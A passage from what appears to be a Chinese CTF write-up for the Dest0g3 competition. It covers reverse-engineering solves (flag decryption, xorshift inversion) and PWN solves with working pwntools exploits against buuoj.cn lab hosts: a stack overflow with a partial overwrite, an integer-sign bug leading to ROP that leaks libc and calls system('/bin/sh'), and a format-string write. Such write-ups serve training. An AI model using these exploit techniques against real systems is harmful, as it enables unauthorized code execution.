class="number">80</span>, <span class="number">32</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">166</span>, <span class="number">157</span>, <span class="number">50</span>]</span><br><span class="line">flag = [((enc[i]-x[i])*gmpy2.invert(<span class="number">23</span>,<span class="number">256</span>))%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZMATH"><a href="#EZMATH" class="headerlink" title="EZMATH"></a>EZMATH</h3><p>ILSpy查看dll文件，主要逻辑代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;Main&gt;$(<span class="built_in">string</span>[] args)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> text = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (!FormatChecker(text))</span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = text.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line"><span class="built_in">byte</span>[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s)));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>,</span><br><span class="line"><span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>,</span><br><span class="line"><span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>,</span><br><span class="line"><span class="number">227</span>, <span class="number">109</span></span><br><span class="line">&#125;.SequenceEqual(second))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Your flag is Dest0g3&#123;&quot;</span> + text + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">err</span>(<span class="params"></span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;err!&quot;</span>);</span><br><span class="line">Environment.Exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">FormatChecker</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Guid result;</span><br><span class="line"><span class="keyword">return</span> Guid.TryParse(input, <span class="keyword">out</span> result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt1</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> <span class="keyword">value</span> = (<span class="built_in">uint</span>)((<span class="built_in">ulong</span>)((<span class="built_in">long</span>)utils.Unpack32(a[(<span class="number">4</span> * i)..(<span class="number">4</span> * (i + <span class="number">1</span>))]) * <span class="number">83987L</span>) % <span class="number">4062393413u</span>L);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt2</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ulong</span> num = utils.Unpack64(a[(<span class="number">8</span> * i)..(<span class="number">8</span> * (i + <span class="number">1</span>))]);</span><br><span class="line"><span class="built_in">ulong</span> <span class="keyword">value</span> = num ^ (num &gt;&gt; <span class="number">25</span>);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入字符串先经 <code>Encrypt1()</code> 以32位形式4位一组做乘法取模运算，再经 <code>Encrypt2()</code> 以64位形式8位一组做xorshift运算，逐步还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>, <span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>, <span class="number">227</span>, <span class="number">109</span>]</span><br><span class="line"></span><br><span class="line">c1 = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invert_right</span>(<span class="params">m,l</span>):</span></span><br><span class="line">    length = <span class="number">64</span></span><br><span class="line">    mx = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * l &lt; length:</span><br><span class="line">        mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m ^ tmp &gt;&gt; l &amp; mx</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c2 = [invert_right(c1[i], <span class="number">25</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    c3 += <span class="built_in">list</span>(long_to_bytes(c2[i]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">c4 = [bytes_to_long(<span class="built_in">bytes</span>(c3[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">c4 = [(k*inverse(<span class="number">83987</span>,<span class="number">4062393413</span>))%<span class="number">4062393413</span> <span class="keyword">for</span> k <span class="keyword">in</span> c4]</span><br><span class="line"></span><br><span class="line">c5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    c5 += <span class="built_in">list</span>(long_to_bytes(c4[i]))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c5))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_8EC();</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s just a easy stack overflow.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fun2();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">fun2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"> </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please leave your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK, you can exploit it now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK, you get it !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>arm的aarch64架构，开了PIE，与后门地址比较发现只有后1个字节不同，把返回地址的尾1字节改为后门地址尾1字节，简单栈溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26257</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x08</span>) + <span class="string">&#x27;\x3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">10</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+34h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+38h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"> </span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the length of array:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)abs32(v2) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n\n----------------------------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choice:\n1.add num\n2.get sum\n3.get avg\n4.exit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;----------------------------------------------------\n&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your choice:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;avg = %d\n&quot;</span>, v6 / v4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no avg!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input num&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1[v4++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">        v6 += v1[i];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;exit!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始的 <code>scanf</code> 处未检查输入，读入负数可致负溢出，再结合写入数据的第二个 <code>scanf</code>， 可以越栈一直写，最后利用ROP修改返回地址，第一次ROP求libc基地址，第二次ROP可getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">n</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input num&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">hackme_addr = elf.sym.hackme</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(puts_plt)</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(puts_got)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;exit!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x67560</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3cf10</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x17b9db</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(signed(system_addr))</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(signed(binsh_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What about your love to Dest0g3?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, format, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 == <span class="number">1314520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I can feel your love!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your dont love Dest0g3 at all!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串漏洞，需要改写值的串在bss段里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29044</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;%12$p%10$p&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1185</span></span><br><span class="line">stack = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0xd8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(stack % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">target = base + <span class="number">0x4010</span></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%39$hn&#x27;</span>.<span class="built_in">format</span>(target % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to 